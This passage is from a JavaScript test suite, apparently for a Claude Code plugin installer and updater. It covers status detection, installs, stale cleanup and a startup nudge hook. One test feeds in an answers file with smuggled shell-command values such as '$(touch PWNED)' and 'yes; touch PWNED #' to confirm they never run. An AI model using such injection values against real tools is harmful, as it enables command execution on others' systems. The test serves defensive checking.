      mkdirSync(join(clone, "extra"), { recursive: true });
      writeFileSync(join(clone, "extra", "x.md"), "---\nname: x\n---\n");
      writeFileSync(join(clone, ".claude-plugin", "marketplace.json"), JSON.stringify({
        plugins: [{ name: "egm", source: "./", agents: ["./extra"] }],
      }));
      const g = growth(s, "new entry extra/x.md (tools *)");
      if (!g.ok) return g;
      writeFileSync(join(clone, ".claude-plugin", "marketplace.json"), JSON.stringify({
        plugins: [{ name: "egm", source: "./", agents: ["../../elsewhere"] }],
      }));
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/skill-shell-line-change-moves-the-hash",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, "skills", "s", "SKILL.md"), "---\nname: s\n---\nbody\n!`echo one`\n");
      return growth(s, "hooks/MCP declarations differ from the pin");
    },
  },
  {
    id: "surface/update-checks-every-covering-install-not-the-first",
    run: (s) => {
      const { inst } = egmWorld(s);
      const old = join(s.root, "mp", "old");
      writePlugin(old, {});
      s.setPlugins([
        s.entry("pro-egm", "project", s.repo),
        { id: "egm@egm", scope: "user", installPath: old },
        { id: "egm@egm", scope: "project", projectPath: s.repo, installPath: inst },
      ]);
      const grown = "---\nname: c\ntools: Bash\n---\n";
      const r = s.run(["run", "egm", "update"], { extra: { FAKE_UPDATE_WRITE: `${join(inst, "agents", "c.md")}|${grown}` } });
      if (r.code === 0) return bad(`exit 0, the older user copy masked the grown one: ${r.out}`);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      if (!a.includes("plugin disable egm@egm --scope project")) return bad(`no project-scope disable: ${JSON.stringify(a)}`);
      if (a.includes("plugin disable egm@egm --scope user")) return bad(`disabled the clean user copy: ${JSON.stringify(a)}`);
      return r.out.includes("agents/c.md") ? ok() : bad(`output: ${r.out}`);
    },
  },
  {
    id: "surface/custom-path-outside-the-plugin-is-unknown",
    run: (s) => {
      const { clone } = egmWorld(s);
      writePlugin(clone, { manifest: { skills: "../../elsewhere" } });
      return growth(s, "surface unknown");
    },
  },
  {
    id: "surface/last-key-wins-and-quoted-keys-are-read",
    run: (s) => {
      const { clone } = egmWorld(s);
      writeFileSync(join(clone, "agents", "a.md"), "---\nname: a\ntools: Read\ntools: Read, Grep, Bash\n---\nbody\n");
      const g = growth(s, "agents/a.md: tools not in the pin: Bash");
      if (!g.ok) return g;
      writeFileSync(join(clone, "agents", "a.md"), "---\nname: a\n\"tools\": Read, Grep, Write\n---\nbody\n");
      return growth(s, "agents/a.md: tools not in the pin: Write");
    },
  },
  {
    id: "status/owner-installed-or-not",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      const st = s.status();
      if (s.engine(st, "lavish").state !== "missing") return bad(`lavish: ${s.engine(st, "lavish").state}, want missing`);
      if (s.engine(st, "qa-skills").state !== "not-applicable") return bad(`qa-skills: ${s.engine(st, "qa-skills").state}, want not-applicable`);
      return ok();
    },
  },
  {
    id: "status/disabled-owner-is-not-applicable",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo, { enabled: false })]);
      return s.engine(s.status(), "lavish").state === "not-applicable" ? ok() : bad("a disabled owner counted");
    },
  },
  {
    id: "status/user-scope-owner-covers-repo",
    run: (s) => {
      s.setPlugins([s.entry("pro-design", "user")]);
      const e = s.engine(s.status(), "impeccable");
      return e.state === "missing" ? ok() : bad(`impeccable: ${e.state}`);
    },
  },
  {
    id: "status/lavish-user-copy-does-not-count",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      mkdirSync(join(s.home, ".claude", "skills", "lavish"), { recursive: true });
      writeFileSync(join(s.home, ".claude", "skills", "lavish", "SKILL.md"), "x");
      if (s.engine(s.status(), "lavish").state !== "missing") return bad("a user-scope lavish copy satisfied detect");
      mkdirSync(join(s.repo, ".claude", "skills", "lavish"), { recursive: true });
      writeFileSync(join(s.repo, LAVISH_FILE), "x");
      return s.engine(s.status(), "lavish").state === "installed" ? ok() : bad("the project-local lavish copy was not detected");
    },
  },
  {
    id: "status/user-scope-impeccable-counts",
    run: (s) => {
      s.setPlugins([s.entry("pro-design", "user")]);
      mkdirSync(join(s.home, ".claude", "skills", "impeccable"), { recursive: true });
      writeFileSync(join(s.home, ".claude", "skills", "impeccable", "SKILL.md"), "x");
      return s.engine(s.status(), "impeccable").state === "installed" ? ok() : bad("user-scope impeccable not detected");
    },
  },
  {
    id: "status/nested-install-counts-other-repo-does-not",
    run: (s) => {
      const nested = join(s.repo, "demo", "app");
      const other = join(s.root, "other-repo");
      mkdirSync(nested, { recursive: true });
      mkdirSync(other, { recursive: true });
      s.setPlugins([s.entry("pro-pdd", "project", nested), s.entry("pro-testing", "project", other)]);
      const st = s.status();
      if (s.engine(st, "lavish").state !== "missing") return bad(`demo/app install did not count: ${s.engine(st, "lavish").state}`);
      if (s.engine(st, "qa-skills").state !== "not-applicable") return bad(`other-repo install counted: ${s.engine(st, "qa-skills").state}`);
      const p = st.plugins.find((x) => x.name === "pro-testing");
      return p && p.covers === false ? ok() : bad("other-repo plugin should report covers false");
    },
  },
  {
    id: "status/lagging-plugin-flagged-from-local-marketplace",
    run: (s) => {
      const loc = join(s.root, "mp");
      mkdirSync(join(loc, ".claude-plugin"), { recursive: true });
      writeFileSync(join(loc, ".claude-plugin", "marketplace.json"), JSON.stringify({ plugins: [{ name: "pro-pdd", version: "2.0.0" }] }));
      writeFileSync(join(s.home, ".claude", "plugins", "known_marketplaces.json"), JSON.stringify({ [MS]: { installLocation: loc } }));
      s.setPlugins([s.entry("pro-pdd", "user", null, { version: "1.0.0" })]);
      const p = s.status().plugins[0];
      return p.lagging && p.latest === "2.0.0" ? ok() : bad(`lagging=${p.lagging} latest=${p.latest}`);
    },
  },
  {
    id: "status/works-without-claude-reads-installed-file",
    run: (s) => {
      writeFileSync(s.installedFile, JSON.stringify({ version: 2, plugins: { [`pro-pdd@${MS}`]: [{ scope: "project", projectPath: s.repo, version: "1.0.0" }] } }));
      const st = s.status({ bin: "noClaude" });
      if (st.source !== "installed_plugins.json") return bad(`source ${st.source}`);
      return s.engine(st, "lavish").state === "missing" ? ok() : bad("fallback file install not used");
    },
  },
  {
    id: "status/list-without-projectPath-falls-back-to-file",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", null)]);
      writeFileSync(s.installedFile, JSON.stringify({ version: 2, plugins: { [`pro-pdd@${MS}`]: [{ scope: "project", projectPath: s.repo, version: "1.0.0" }] } }));
      const st = s.status();
      return st.source === "installed_plugins.json" && s.engine(st, "lavish").state === "missing" ? ok() : bad(`source ${st.source}`);
    },
  },
  {
    id: "status/declined-and-needs-question",
    run: (s) => {
      s.setPlugins([s.entry("pro-design", "project", s.repo)]);
      let e = s.engine(s.status(), "taste-skill");
      if (!(e.state === "missing" && e.needsQuestion)) return bad("unanswered optional row should need a question");
      const a = s.run(["answer", "taste-skill", "no"]);
      if (a.code !== 0) return bad(`answer exited ${a.code}: ${a.out}`);
      e = s.engine(s.status(), "taste-skill");
      if (e.state !== "declined" || e.needsQuestion) return bad(`after no: ${e.state} needsQuestion=${e.needsQuestion}`);
      const f = json(s.answersPath);
      return f.answers["taste-skill"].answer === "no" && Number.isInteger(f.answers["taste-skill"].registryVersion)
        ? ok() : bad("answer not saved with its registry version");
    },
  },
  {
    id: "answer/default-or-unknown-rows-are-refused",
    run: (s) => {
      if (s.run(["answer", "lavish", "yes"]).code === 0) return bad("a default row accepted an answer");
      if (s.run(["answer", "nope", "yes"]).code === 0) return bad("an unknown id accepted an answer");
      return existsSync(s.answersPath) ? bad("a refused answer wrote the file") : ok();
    },
  },
  {
    id: "run/install-records-registry-argv-in-repo-and-is-idempotent",
    run: (s, pr) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      const extra = { FAKE_NPX_FILES: LAVISH_FILE };
      const r = s.run(["run", "lavish", "install"], { extra });
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const npx = s.calls("npx");
      const want = registry(pr).engines.find((e) => e.id === "lavish").install.slice(1);
      if (npx.length !== 1 || !same(npx[0].argv, want)) return bad(`npx argv ${JSON.stringify(npx.map((c) => c.argv))}`);
      if (realpathSync(npx[0].cwd) !== s.repo) return bad(`cwd ${npx[0].cwd}`);
      const again = s.run(["run", "lavish", "install"], { extra });
      if (s.calls("npx").length !== 1) return bad("second install ran npx again");
      return again.out.includes("already installed") ? ok() : bad(`second run said: ${again.out}`);
    },
  },
  {
    id: "run/update-needs-an-installed-engine",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      s.run(["run", "lavish", "update"]);
      if (s.calls("npx").length) return bad("update ran on a missing engine");
      mkdirSync(join(s.repo, ".claude", "skills", "lavish"), { recursive: true });
      writeFileSync(join(s.repo, LAVISH_FILE), "x");
      s.run(["run", "lavish", "update"]);
      const npx = s.calls("npx");
      return npx.length === 1 && npx[0].argv.includes("kunchenguid/lavish-axi") ? ok() : bad("update did not run the update argv");
    },
  },
  {
    id: "run/owner-missing-is-skipped",
    run: (s) => {
      s.setPlugins([]);
      const r = s.run(["run", "lavish", "install"]);
      return r.code === 0 && !s.calls().length && r.out.includes("skipped") ? ok() : bad(`code ${r.code}, calls ${s.calls().length}, out ${r.out}`);
    },
  },
  {
    id: "run/all-install-carries-on-after-a-failure",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo), s.entry("pro-testing", "project", s.repo)]);
      const r = s.run(["run", "all", "install"], { extra: { FAKE_FAIL_MATCH: "kunchenguid", FAKE_NPX_FILES: QA_FILES.join(":") } });
      if (r.code !== 1) return bad(`exit ${r.code}, want 1`);
      const argvs = s.calls("npx").map((c) => c.argv.join(" "));
      if (!argvs.some((a) => a.includes("kunchenguid"))) return bad("lavish never ran");
      if (!argvs.some((a) => a.includes("petrkindlmann"))) return bad("run stopped after the failure");
      if (!r.out.includes("Retry")) return bad(`no retry line: ${r.out}`);
      const st = s.status();
      return s.engine(st, "qa-skills").state === "installed" && s.engine(st, "lavish").state === "missing" ? ok() : bad("states after the run are wrong");
    },
  },
  {
    id: "run/all-install-twice-changes-nothing-and-asks-nothing",
    run: (s, pr) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      const extra = { FAKE_NPX_FILES: [LAVISH_FILE, ".claude/skills/impeccable/SKILL.md"].join(":") };
      const r1 = s.run(["run", "all", "install"], { extra });
      if (r1.code !== 0) return bad(`first run exit ${r1.code}: ${r1.out}`);
      const first = read(s.answersPath);
      if (json(s.answersPath).registryVersion !== registry(pr).version) return bad("registryVersion not recorded");
      const n = s.calls().length;
      const homeBefore = readdirSync(join(s.home, ".claude")).sort().join();
      const r2 = s.run(["run", "all", "install"], { extra });
      if (r2.code !== 0) return bad(`second run exit ${r2.code}`);
      if (s.calls().length !== n) return bad("second run called an installer");
      if (read(s.answersPath) !== first) return bad("second run rewrote pro-dev.json");
      if (readdirSync(join(s.home, ".claude")).sort().join() !== homeBefore) return bad("run touched HOME");
      return s.status().engines.some((e) => e.needsQuestion && e.default) ? bad("default row asks a question") : ok();
    },
  },
  {
    id: "run/optional-yes-installs-and-optional-unanswered-does-not",
    run: (s) => {
      s.setPlugins([s.entry("pro-design", "project", s.repo)]);
      s.run(["answer", "taste-skill", "yes"]);
      s.run(["run", "all", "install"], { extra: { FAKE_NPX_FILES: "impeccable@@.claude/skills/impeccable/SKILL.md:taste-skill@@.claude/skills/design-taste-frontend/SKILL.md" } });
      const argvs = s.calls("npx").map((c) => c.argv.join(" "));
      if (!argvs.some((a) => a.includes("Leonxlnx/taste-skill"))) return bad("answered-yes row was not installed");
      if (argvs.some((a) => a.includes("MengTo/Skills"))) return bad("an unanswered optional row was installed");
      return ok();
    },
  },
  {
    id: "run/hostile-answers-file-is-never-executed",
    run: (s) => {
      const evil = "yes; touch PWNED #";
      s.setPlugins([s.entry("pro-pdd", "project", s.repo), s.entry("pro-design", "project", s.repo)]);
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      writeFileSync(s.answersPath, JSON.stringify({
        registryVersion: "$(touch PWNED)",
        answers: { "taste-skill": { answer: evil }, "../../x; touch PWNED": { answer: "yes" }, lavish: { answer: "$(touch PWNED)" } },
      }));
      const r = s.run(["run", "all", "install"], { extra: { FAKE_NPX_FILES: [LAVISH_FILE, ".claude/skills/impeccable/SKILL.md"].join(":") } });
      if (existsSync(join(s.repo, "PWNED")) || existsSync(join(s.root, "PWNED"))) return bad("hostile text ran as a command");
      const all = s.calls().map((c) => c.argv.join(" ")).join("\n");
      if (all.includes("PWNED") || all.includes("touch")) return bad("hostile text reached an argv");
      if (all.includes("Leonxlnx")) return bad("a non-yes answer installed taste-skill");
      return r.code === 0 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "answers/malformed-file-is-not-overwritten",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      writeFileSync(s.answersPath, "{not json");
      const r = s.run(["answer", "taste-skill", "yes"]);
      const r2 = s.run(["run", "all", "install"], { extra: { FAKE_NPX_FILES: LAVISH_FILE } });
      if (r.code === 0 || r2.code === 0) return bad(`accepted: ${r.code} ${r2.code}`);
      if (read(s.answersPath) !== "{not json") return bad("malformed file was overwritten");
      if (existsSync(`${s.answersPath}.bak`)) return bad("a .bak was created");
      return /fix or delete/i.test(r.out) ? ok() : bad(`message: ${r.out}`);
    },
  },
  {
    id: "answers/symlinked-file-is-refused-and-target-untouched",
    run: (s) => {
      const outside = join(s.root, "outside-zshrc");
      writeFileSync(outside, "export SECRET=1\n");
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      symlinkSync(outside, s.answersPath);
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      const r1 = s.run(["answer", "taste-skill", "yes"]);
      if (!/not a regular file/.test(r1.out)) return bad(`message: ${r1.out}`);
      const r2 = s.run(["run", "all", "install"], { extra: { FAKE_NPX_FILES: LAVISH_FILE } });
      if (r1.code === 0) return bad("answer accepted a symlinked file");
      if (r2.code === 0) return bad("run did not report the refusal");
      if (read(outside) !== "export SECRET=1\n") return bad("outside file changed");
      if (existsSync(`${s.answersPath}.bak`)) return bad("a .bak copy was made");
      const st = s.status();
      return st.answersFileMalformed === true ? ok() : bad("status did not flag the unsafe file");
    },
  },
  {
    id: "answers/symlinked-claude-dir-is-refused",
    run: (s) => {
      const elsewhere = join(s.root, "elsewhere");
      mkdirSync(elsewhere);
      symlinkSync(elsewhere, join(s.repo, ".claude"));
      const r = s.run(["answer", "taste-skill", "yes"]);
      if (r.code === 0) return bad("accepted a symlinked .claude");
      return readdirSync(elsewhere).length === 0 ? ok() : bad(`wrote ${readdirSync(elsewhere)}`);
    },
  },
  {
    id: "answers/oversized-file-reads-as-malformed",
    run: (s) => {
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      writeFileSync(s.answersPath, JSON.stringify({ pad: "x".repeat(70 * 1024) }));
      return s.status().answersFileMalformed === true ? ok() : bad("not flagged");
    },
  },
  {
    id: "run/missing-npx-gives-a-clear-message",
    run: (s) => {
      s.setPlugins([s.entry("pro-pdd", "project", s.repo)]);
      const r = s.run(["run", "lavish", "install"], { bin: "noNpx" });
      return r.code === 1 && /npx is not on PATH/.test(r.out) ? ok() : bad(`code ${r.code}: ${r.out}`);
    },
  },
  {
    id: "run/claude-plugin-companion-uses-claude-argv",
    run: (s) => {
      s.setPlugins([s.entry("pro-nextjs", "project", s.repo)]);
      s.run(["answer", "vercel", "yes"]);
      s.run(["run", "vercel", "install"]);
      const c = s.calls("claude");
      return c.length === 1 && same(c[0].argv, ["plugin", "install", "vercel@claude-plugins-official", "--scope", "project"]) ? ok() : bad(JSON.stringify(c));
    },
  },
  {
    id: "plugins/update-runs-per-scope-from-each-install-folder",
    run: (s) => {
      const nested = join(s.repo, "demo", "app");
      const other = join(s.root, "other-repo");
      mkdirSync(nested, { recursive: true });
      mkdirSync(other, { recursive: true });
      s.setPlugins([
        s.entry("pro-quality", "user", null, { version: "0.1.0" }),
        s.entry("pro-quality", "project", nested, { version: "0.1.0" }),
        s.entry("pro-core", "project", other, { version: "0.1.0" }),
        { id: "figma@claude-plugins-official", scope: "user" },
      ]);
      const r = s.run(["plugins", "update"], { extra: { FAKE_NEW_VERSION: "0.2.0" } });
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const c = s.calls("claude");
      if (!same(c[0].argv, ["plugin", "marketplace", "update", MS])) return bad(`first call ${JSON.stringify(c[0])}`);
      const ups = c.filter((x) => x.argv[1] === "update" && x.argv[0] === "plugin");
      if (ups.length !== 2) return bad(`${ups.length} plugin updates, want 2`);
      const user = ups.find((x) => x.argv.includes("user"));
      const proj = ups.find((x) => x.argv.includes("project"));
      if (!user || realpathSync(user.cwd) !== s.repo) return bad("user-scope update not run from the repo");
      if (!proj || realpathSync(proj.cwd) !== nested) return bad(`project update cwd ${proj?.cwd}`);
      if (ups.some((x) => x.argv.some((a) => a.includes("other") || a.includes("figma")))) return bad("updated an install outside the repo");
      return /0\.1\.0 -> 0\.2\.0/.test(r.out) ? ok() : bad(`no before/after line: ${r.out}`);
    },
  },
  {
    id: "plugins/update-survives-a-failed-step",
    run: (s) => {
      s.setPlugins([s.entry("pro-quality", "user"), s.entry("pro-pdd", "user")]);
      const r = s.run(["plugins", "update"], { extra: { FAKE_FAIL_MATCH: "pro-quality@" } });
      const ups = s.calls("claude").filter((x) => x.argv[1] === "update" && x.argv[0] === "plugin");
      return r.code === 1 && ups.length === 2 && /Retry/.test(r.out) ? ok() : bad(`code ${r.code}, updates ${ups.length}, out ${r.out}`);
    },
  },
  {
    id: "plugins/swap-starter-installs-stack-first-then-uninstalls",
    run: (s) => {
      s.setPlugins([s.entry("pro-starter", "project", s.repo), s.entry("pro-nextjs", "project", s.repo)]);
      const r = s.run(["plugins", "swap-starter"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      const want = [
        `plugin install pro-nextjs@${MS} --scope project`,
        `plugin install pro-dev-starter@${MS} --scope project`,
        `plugin uninstall pro-starter@${MS} --scope project`,
      ];
      return same(a, want) ? ok() : bad(JSON.stringify(a));
    },
  },
  {
    id: "plugins/swap-starter-skips-a-disabled-shim",
    run: (s) => {
      s.setPlugins([s.entry("pro-starter", "user", null, { enabled: false })]);
      const r = s.run(["plugins", "swap-starter"]);
      return r.code === 0 && !s.calls("claude").length && /pro-starter user: disabled, skipped/.test(r.out) ? ok() : bad(`code ${r.code}, calls ${s.calls().length}, out ${r.out}`);
    },
  },
  {
    id: "plugins/swap-starter-leaves-a-disabled-dep-alone",
    run: (s) => {
      s.setPlugins([s.entry("pro-starter", "project", s.repo), s.entry("pro-nextjs", "project", s.repo), s.entry("pro-astro", "project", s.repo, { enabled: false })]);
      const r = s.run(["plugins", "swap-starter"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      const want = [
        `plugin install pro-nextjs@${MS} --scope project`,
        `plugin install pro-dev-starter@${MS} --scope project`,
        `plugin uninstall pro-starter@${MS} --scope project`,
      ];
      return same(a, want) ? ok() : bad(JSON.stringify(a));
    },
  },
  {
    id: "plugins/swap-starter-keeps-the-shim-when-the-install-fails",
    run: (s) => {
      s.setPlugins([s.entry("pro-starter", "project", s.repo)]);
      const r = s.run(["plugins", "swap-starter"], { extra: { FAKE_FAIL_MATCH: "pro-dev-starter@" } });
      const a = s.calls("claude").map((c) => c.argv.join(" "));
      return r.code === 1 && !a.some((x) => x.includes("uninstall")) ? ok() : bad(`code ${r.code}, calls ${JSON.stringify(a)}`);
    },
  },
  {
    id: "plugins/swap-starter-does-nothing-without-the-shim",
    run: (s) => {
      s.setPlugins([s.entry("pro-core", "user")]);
      const r = s.run(["plugins", "swap-starter"]);
      return r.code === 0 && !s.calls().length ? ok() : bad(`code ${r.code}, calls ${s.calls().length}`);
    },
  },
  {
    id: "stale/lists-only-dead-pro-dev-entries",
    run: (s) => {
      const live = join(s.root, "live");
      mkdirSync(live);
      const doc = { version: 2, plugins: {
        [`pro-quality@${MS}`]: [{ scope: "project", projectPath: join(s.root, "gone"), version: "1" }, { scope: "project", projectPath: live, version: "1" }],
        "figma@claude-plugins-official": [{ scope: "project", projectPath: join(s.root, "gone2"), version: "1" }],
        [`pro-core@${MS}`]: [{ scope: "user", version: "1" }],
      } };
      writeFileSync(s.installedFile, JSON.stringify(doc, null, 2));
      const before = read(s.installedFile);
      const r = s.run(["stale"]);
      const lines = r.out.split("\n").filter((l) => l.startsWith("stale:"));
      if (lines.length !== 1 || !lines[0].includes("pro-quality")) return bad(`listed ${JSON.stringify(lines)}`);
      return read(s.installedFile) === before ? ok() : bad("listing changed the file");
    },
  },
  {
    id: "stale/skips-entries-on-unmounted-volumes",
    run: (s) => {
      const doc = { version: 2, plugins: {
        [`pro-quality@${MS}`]: [
          { scope: "project", projectPath: "/Volumes/pro-dev-test-no-such-drive/work/app", version: "1" },
          { scope: "project", projectPath: join(s.root, "gone"), version: "1" },
        ],
      } };
      writeFileSync(s.installedFile, JSON.stringify(doc));
      const r = s.run(["stale"]);
      const lines = r.out.split("\n").filter((l) => l.startsWith("stale:"));
      if (lines.length !== 1 || lines[0].includes("/Volumes/")) return bad(`listed ${JSON.stringify(lines)}`);
      if (!/unmounted drives are skipped/.test(r.out)) return bad("no skip note in output");
      const r2 = s.run(["stale", "--remove"]);
      return json(s.installedFile).plugins[`pro-quality@${MS}`].some((e) => e.projectPath.startsWith("/Volumes/"))
        ? ok() : bad(`--remove dropped the unmounted entry: ${r2.out}`);
    },
  },
  {
    id: "stale/remove-writes-backup-and-removes-only-dead-entries",
    run: (s) => {
      const live = join(s.root, "live");
      mkdirSync(live);
      const doc = { version: 2, plugins: {
        [`pro-quality@${MS}`]: [{ scope: "project", projectPath: join(s.root, "gone"), version: "1" }, { scope: "project", projectPath: live, version: "1" }],
        [`pro-pdd@${MS}`]: [{ scope: "project", projectPath: join(s.root, "gone"), version: "1" }],
        "figma@claude-plugins-official": [{ scope: "project", projectPath: join(s.root, "gone2"), version: "1" }],
        [`pro-core@${MS}`]: [{ scope: "user", version: "1" }],
      } };
      const original = JSON.stringify(doc, null, 2);
      writeFileSync(s.installedFile, original);
      const r = s.run(["stale", "--remove"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const dir = dirname(s.installedFile);
      const baks = readdirSync(dir).filter((f) => f.startsWith("installed_plugins.json.bak-"));
      if (baks.length !== 1) return bad(`${baks.length} backups`);
      if (read(join(dir, baks[0])) !== original) return bad("backup differs from the original");
      const now = json(s.installedFile);
      const want = { version: 2, plugins: {
        [`pro-quality@${MS}`]: [{ scope: "project", projectPath: live, version: "1" }],
        "figma@claude-plugins-official": doc.plugins["figma@claude-plugins-official"],
        [`pro-core@${MS}`]: doc.plugins[`pro-core@${MS}`],
      } };
      return same(now, want) ? ok() : bad(`result ${JSON.stringify(now)}`);
    },
  },
  {
    id: "stale/remove-refuses-an-unknown-shape",
    run: (s) => {
      for (const body of [
        JSON.stringify({ version: 3, plugins: { [`pro-quality@${MS}`]: [{ scope: "project", projectPath: join(s.root, "gone") }] } }),
        JSON.stringify({ version: 2, plugins: [] }),
        JSON.stringify({ version: 2, plugins: { [`pro-quality@${MS}`]: { scope: "project" } } }),
        "{broken",
      ]) {
        writeFileSync(s.installedFile, body);
        const r = s.run(["stale", "--remove"]);
        if (r.code === 0) return bad(`accepted ${body}`);
        if (read(s.installedFile) !== body) return bad(`changed ${body}`);
        if (readdirSync(dirname(s.installedFile)).some((f) => f.includes(".bak-"))) return bad("wrote a backup for an unknown shape");
      }
      return ok();
    },
  },
  {
    id: "stale/missing-file-is-not-an-error",
    run: (s) => {
      const r = s.run(["stale", "--remove"]);
      return r.code === 0 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
];

// The nudge: needs the plugin root's registry version, so it computes a matching and a differing one.
function nudgeCase(id, setup, expectLine, { payload = {}, cwdKey = "repo" } = {}) {
  return {
    id: `nudge/${id}`,
    run: (s, pr) => {
      const current = registry(pr).version;
      const dir = setup(s, current) ?? s[cwdKey];
      const r = spawnSync("python3", [s.nudge], {
        encoding: "utf8", env: { PATH: s.env().PATH, HOME: s.home }, cwd: dir,
        input: JSON.stringify({ cwd: dir, source: "startup", ...payload }),
      });
      if (r.status !== 0) return bad(`exit ${r.status}: ${r.stderr}`);
      const out = r.stdout.trim();
      if (expectLine) {
        return out.split("\n").length === 1 && (() => { try { return JSON.parse(out).hookSpecificOutput.additionalContext.endsWith("pro-dev plugins changed since the last /pro-dev run: run /pro-dev update"); } catch { return false; } })()
          ? ok() : bad(`stdout ${JSON.stringify(out)}`);
      }
      return out === "" ? ok() : bad(`should be silent, printed ${JSON.stringify(out)}`);
    },
  };
}
const writeSaved = (s, v) => {
  mkdirSync(join(s.repo, ".claude"), { recursive: true });
  writeFileSync(s.answersPath, typeof v === "string" ? v : JSON.stringify(v));
};
CASES.push(
  nudgeCase("version-mismatch-prints-one-line", (s, cur) => writeSaved(s, { registryVersion: cur + 1 }), true),
  nudgeCase("older-saved-version-prints-one-line", (s, cur) => writeSaved(s, { registryVersion: cur - 1 }), true),
  nudgeCase("match-is-silent", (s, cur) => writeSaved(s, { registryVersion: cur }), false),
  nudgeCase("missing-file-is-silent", () => {}, false),
  nudgeCase("malformed-file-is-silent-and-exits-zero", (s) => writeSaved(s, "{nope"), false),
  nudgeCase("non-object-json-is-silent", (s) => writeSaved(s, "[1,2]"), false),
  nudgeCase("non-integer-version-is-silent", (s) => writeSaved(s, { registryVersion: "1" }), false),
  nudgeCase("file-without-version-is-silent", (s) => writeSaved(s, { answers: {} }), false),
  nudgeCase("compaction-is-silent", (s, cur) => writeSaved(s, { registryVersion: cur + 1 }), false, { payload: { source: "compact" } }),
  nudgeCase("subfolder-of-the-repo-still-prints", (s, cur) => {
    writeSaved(s, { registryVersion: cur + 1 });
    const sub = join(s.repo, "pkg", "web");
    mkdirSync(sub, { recursive: true });
    return sub;
  }, true),
  nudgeCase("outside-a-git-repo-is-silent", (s, cur) => {
    const plain = join(s.root, "plain");
    mkdirSync(join(plain, ".claude"), { recursive: true });
    writeFileSync(join(plain, ".claude", "pro-dev.json"), JSON.stringify({ registryVersion: cur + 1 }));
    return plain;
  }, false),
  {
    id: "nudge/fifo-at-the-path-is-silent-and-quick",
    run: (s) => {
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      const m = spawnSync("mkfifo", [s.answersPath]);
      if (m.error || m.status !== 0) return ok("skipped: mkfifo unavailable");
      const t0 = Date.now();
      const r = spawnSync("python3", [s.nudge], { encoding: "utf8", env: { PATH: s.env().PATH, HOME: s.home }, cwd: s.repo, input: "{}", timeout: 5000 });
      if (r.error) return bad(`hung or failed: ${r.error.message}`);
      if (Date.now() - t0 > 3000) return bad("too slow");
      return r.status === 0 && r.stdout.trim() === "" ? ok() : bad(`status ${r.status}, stdout ${JSON.stringify(r.stdout)}`);
    },
  },
  {
    id: "nudge/symlink-to-dev-zero-is-silent",
    run: (s) => {
      if (!existsSync("/dev/zero")) return ok("skipped: no /dev/zero");
      mkdirSync(join(s.repo, ".claude"), { recursive: true });
      symlinkSync("/dev/zero", s.answersPath);
      const r = spawnSync("python3", [s.nudge], { encoding: "utf8", env: { PATH: s.env().PATH, HOME: s.home }, cwd: s.repo, input: "{}", timeout: 5000 });
      if (r.error) return bad(`hung or failed: ${r.error.message}`);
      return r.status === 0 && r.stdout.trim() === "" ? ok() : bad(`status ${r.status}, stdout ${JSON.stringify(r.stdout)}`);
    },
  },
  {
    id: "nudge/garbage-stdin-still-exits-zero",
    run: (s) => {
      const r = spawnSync("python3", [s.nudge], { encoding: "utf8", env: { PATH: s.env().PATH, HOME: s.home }, cwd: s.repo, input: "not json at all" });
      return r.status === 0 ? ok() : bad(`exit ${r.status}`);
    },
  },
  {
    id: "nudge/never-writes",
    run: (s, pr) => {
      writeSaved(s, { registryVersion: registry(pr).version + 1 });
      const before = read(s.answersPath);
      spawnSync("python3", [s.nudge], { encoding: "utf8", env: { PATH: s.env().PATH, HOME: s.home }, cwd: s.repo, input: "{}" });
      return read(s.answersPath) === before && !s.calls().length ? ok() : bad("nudge changed a file or ran a tool");
    },
  },
);

// --- gitExclude (R31) ----------------------------------------------------------

const GX_DIR = ".claude/skills/deploy-to-vercel/";
const GX_FILE = `${GX_DIR}SKILL.md`;
function gxRow(paths = [GX_DIR]) {
  return {
    id: "gx", owner: "pro-ship", bridges: [], kind: "skills-cli", default: true,
    detect: { all: [{ file: "skills/deploy-to-vercel/SKILL.md", scopes: ["project"] }] },
    install: ["npx", "skills", "add", "x/y", "-a", "claude-code", "-y", "-s", "deploy-to-vercel"],
    update: ["npx", "skills", "add", "x/y", "-a", "claude-code", "-y", "-s", "deploy-to-vercel"],
    gitExclude: paths, why: "test row",
  };
}
const gxWorld = (s, paths) => {
  s.useRows([gxRow(paths)]);
  s.setPlugins([s.entry("pro-ship", "project", s.repo)]);
  return { extra: { FAKE_NPX_FILES: GX_FILE } };
};
const gitIn = (cwd, args) => spawnSync("git", args, { cwd, encoding: "utf8" });
const excludeFile = (repo) => join(repo, ".git", "info", "exclude");
const excludeText = (repo) => (existsSync(excludeFile(repo)) ? read(excludeFile(repo)) : "");
const gxCount = (text) => text.split("\n").filter((l) => l === GX_DIR).length;

CASES.push(
  {
    id: "gitExclude/already-installed-still-gets-the-exclude",
    run: (s) => {
      const o = gxWorld(s);
